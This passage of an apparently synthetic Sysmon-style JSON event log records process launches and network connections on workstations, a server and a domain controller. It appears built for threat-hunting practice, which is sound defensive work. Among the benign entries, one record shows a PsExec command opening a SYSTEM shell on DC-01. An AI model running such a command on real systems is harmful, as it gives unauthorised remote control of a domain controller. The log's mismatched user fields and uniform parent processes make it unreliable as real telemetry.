  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-24T21:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3836",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=92b81db0a5d4c47110ef63c0577291fff184b15549e661cd89a5adadeac54c2a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-13T13:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8363",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1bc8575584c7d85ca921220a7342a275223c7d2c9fc8dea2c9b2599a30b48e7b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-29T05:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7880",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b1d47a02c6afb80c73dbf8fe1d7d2857c7650d9ed421ab4273e8cf46546db5af"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-09T06:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1281",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=71f164b8ac3b1404a00acbb2e59a9afc614e6562e348e4edd1fa468561e95b32"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-16T02:52:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6144",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d5e702b81acf3a752a3507788a3ad56d5d68e997167e9db8a693e87582d293e5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-24T01:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6372",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1c8423e901aa4918e85a188a39838ca75924270977bc8f9ed6344553762d2a5d"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-02T12:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.75",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.72",
      "SourcePort": "53330"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-13T11:06:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "6757",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=72042788847b960282fe3f37296a41d4bc378478f35fecdc5740d840569e9b09"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-14T14:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.72",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.123",
      "SourcePort": "50143"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "alice",
    "UtcTime": "2024-03-15T06:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "8744",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a56b1cac3f341537d24ea61245efe9ec021d6fa039af36d5dba43dc7f394a0cd"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-04T05:57:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5513",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=71de5d850ed8ccfbf5912ebd1e950a87ffe34271a193933a1faeaa1ec3654d42"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "bob",
    "UtcTime": "2024-03-18T10:37:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "2123",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=89b7c6174d11d3a722f92ec7c4744c078e6487c93d30f9abb245154088cf0234"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-19T12:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "6689",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b924e2619f1938673ead0228332f67381acf0e242370dd839230e8700a17af5a"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-13T14:38:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.150",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.143",
      "SourcePort": "57969"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "bob",
    "UtcTime": "2024-03-31T06:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7598",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=46faf2f9d337de496743e9e3a6538030c597e931663a4af314b65253f53ba748"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-18T02:18:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "5521",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4a5cc4d7de2abac55262994a5187652a8aa0da56b2e99f7f9c94f4d6d3dff694"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-02T14:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "6680",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5064b7595d2e0b15670937aab2ab12306cc048205cd1a3c1562fafd9def0ce26"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "administrator",
    "UtcTime": "2024-03-27T04:29:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4912",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=fe34777c535b2004d0ca130f7d85d3bea8bbad005e5266ddf5bb727c204bc559"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-05T08:44:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1416",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d4f0399f094f5aaf327113fa8f1cd4c7e5aa4957fcf3727e00b4ca3f7529d024"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-06",
    "UserName": "dave",
    "UtcTime": "2024-03-26T08:52:00Z",
    "EventData": {
      "SubjectUserName": "alice",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-12T00:26:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.208",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.5",
      "SourcePort": "63702"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-27T09:05:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "2160",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6dc6fb15ad567b64f40d29b6c9ea5eef85b9fd2f8c375ec5e404ecac4d0558ed"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-15T04:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1668",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3d9766b7bc7712b7c779621ad97d86c8641de0e687df503967e0c44aff291185"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-06T18:19:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1028",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b195d13c4ab1156a40b739db243357f561923886ff374166a0bdb3703e6a05b9"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "bob",
    "UtcTime": "2024-03-12T10:02:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1962",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c1d665e9127aa699850364307459f4b0fb352a1738e5a370f6e237386705fb90"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-13T16:28:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7258",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f339da6e85eb4c0707f32663afe440d73241ec9c539e3d25159a3cbbcd6417cc"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-13T07:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "3503",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b3e7e358c83d5232092d663b8ab5255238248d43c4ac5913293c3a19872bfcd8"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-26T16:25:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2446",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ec7b16adfacb68c073c9c076af18bfd153c9d05f6c0e5c06a7e640c95172e45e"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-27T09:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9206",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1c4bb6b31b28992d1e90440cfd6a1d52b504c9e8afd9f1356ce0b00ce7b6f919"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-11T09:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.110",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.72",
      "SourcePort": "57824"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-09T01:18:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5590",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b9febefcf6419f7bd2c7f0951324354e8d746b766773c35baa5d99a245660c2c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "dave",
    "UtcTime": "2024-03-08T10:02:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3496",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e03341066d95fd6bfd5a7053e4dd166591eec94b3f8d6f72abe2776e07196e79"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-26T14:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5074",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=264d54cb3437d144517a728d0dfa325317279e3aa9ab28259a94cdf8f3ab47c7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T10:00:00Z",
    "EventData": {
      "Image": "C:\\tools\\PsExec64.exe",
      "CommandLine": "psexec64.exe \\\\DC-01 -s cmd.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4790",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=eae53dfe46d86c94961ca9b850719f5bdb71babf48370b3c5d5b89a787b741d1"
    }
  },
  {
    "EventID": 3,
    "Computer": "SERVER-02",
    "UtcTime": "2024-03-10T19:39:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.123",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.83",
      "SourcePort": "57715"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "alice",
    "UtcTime": "2024-03-04T01:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1771",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=719392fd961e747423087c8d3f5eb16a14c002e2898faf6943d259709ce0c6ec"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-30T13:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.68",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.99",
      "SourcePort": "53054"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-28T22:46:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "6105",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=068132e80c39a71723c188a834d47c41378d434d480e9d63091d806fd5bfa92e"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-11T05:58:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.250",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.207",
      "SourcePort": "62382"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-20T23:59:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "3657",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6a5e4968116b00d0405095d15b1135fc0f239eb84e80f9932f21e91db3477fb1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T08:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "5492",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8427a679865dd07279ed8ebb29b0b8ed3201f236d79b04c871fae5736c1d2f95"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-06T11:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.82",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.79",
      "SourcePort": "57721"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-27T16:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7590",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ed93bdf0d016da04d5d58fa4d1e28dda4f1d75ec2957425fc089556dce3b5397"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "alice",
    "UtcTime": "2024-03-11T14:28:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4385",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d6f23b444eab241d3947fe3721f2740f742fa11606b18ae22cf4255fc79e5111"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "alice",
    "UtcTime": "2024-03-14T11:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5706",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0abcf6243f15fcf025dfa48cd9c736cab5398e9ebfc2772fa4993c8d974fc820"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-27T01:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8284",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6566b59c43e231e36d9f1f10ed948de60b575dcf27f36e086d737263f2d4d3a9"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-22T23:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9212",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=54df2e497da407c630be90f68b1ede7279c943caf4ba1339d0b19d1e42af0cb7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-03T07:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1632",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6ba8f248436c4e5b5bceaf81006b0e131e890f46bf5e6036a5c957940ee3f3cb"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "administrator",
    "UtcTime": "2024-03-06T04:48:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5920",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a0f204e1b44fdbe45a9b815853d0cfac7c1257e3eb38a976f76614d91bb98a1a"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-18T22:48:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "3523",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f440249afd6a2732c86abe584d4deea7e7ae5cf40e613f239b2d086bd94246f1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-29T17:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1761",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=624726e7b9e1371739e1bf660f455d0b7103f12cbe744e4899a622067ea3cc27"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-20T04:37:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9476",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=82e2484107d86e08de50dc9c30a19ca1d5566f06786741d7bd9df921967a8175"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-10T14:39:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6833",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f905ecd105024375dddbb2141e17fcf7f3c72a7f32faf5ee56f12a2c890bff9f"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-16T17:35:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.144",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.26",
      "SourcePort": "60529"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-17T01:40:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.21",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.123",
      "SourcePort": "62825"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-04T14:13:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5417",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a8951d47a1a7496514770d643f4fcc595dcf394283d0f302a13cee5d1b923c35"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-02T04:49:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1206",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ed8e2d237c0919c55a41c31fd865ad9b8bc6dbd843642ab5651b0f3408e2bc08"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-07T09:29:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5057",
      "IntegrityLevel": "High",
